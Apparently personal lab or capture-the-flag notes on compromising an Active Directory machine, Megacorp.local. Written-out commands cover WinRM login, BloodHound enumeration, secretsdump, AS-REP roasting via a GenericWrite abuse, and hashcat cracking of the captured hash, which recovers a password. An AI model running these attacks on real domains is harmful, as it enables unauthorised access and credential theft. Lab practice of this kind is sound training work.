
```
evil-winrm -u 'sbauer' -p 'D3veL0pM3nT!' -i 10.10.10.179
```

![[Pasted image 20241002141912.png]]

![[Pasted image 20241002142112.png]]

![[Pasted image 20241002142511.png]]

![[Pasted image 20241002142528.png]]

```
bloodhound-python -d Megacorp.local -u sbauer -p 'D3veL0pM3nT!' -ns 10.10.10.179  -c all
```

![[Pasted image 20241002142806.png]]

```
secretsdump.py Megaccorp.local/sbauer:'D3veL0pM3nT!'@10.10.10.179
```
![[Pasted image 20241002142952.png]]

Will run PlumHound
```
python3 Plumhound.py -x tasks/default.tasks -p password
```

![[Pasted image 20241002155625.png]]

Open the index.html

![[Pasted image 20241002160246.png]]

SO i think there is something related to Kerberoasting
![[Pasted image 20241002182552.png]]

Will make Jorden kerberoastable as we have Generic Write permission.
![[Pasted image 20241002183013.png]]

```
Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```

![[Pasted image 20241002183657.png]]

```
$krb5asrep$jorden@MEGACORP.LOCAL:839beaa1345018b8b309dc6ec5623080$fa86c2524898d87e489a1a8dc41bcb3e9b652e8dee251f9a156d262756bdbdb91ff28f60704c46da450ef0bd2b5bd0d211fa4d518dc2c4ac8ce0aad2e9c93f2c9a9b0babb8ffad04348f974310441d69fde802ebfb9d1120f9b3b3fbe243e734395f69d83354aaaaa41ac326c01cad23fb3e573a584a974bd0d35e9b8a26ad013b93eec5c9c3aa5c6721533c7d29f4f8acc962189a5983b823a33300561ac694134a9ebb11f14d825b097093455c16f530b50cc6b7d6bdd910188ac2cac0551c2b8921557976e9303334887ca10f8495cb98c1a8b2570eee6f7f0fb99eff9def534e7fe1fcf71d1b6df3238831d69504
```

Let's crack it
```
hashcat --help | grep Kerberos
```

![[Pasted image 20241002183907.png]]

so the module is 18200 according to me.

```
 .\hashcat.exe -m 18200 -D 2 .\hashes4.txt .\rockyou.txt -O
```

![[Pasted image 20241002184238.png]]

Got the password for the user
```
rainforest786
```

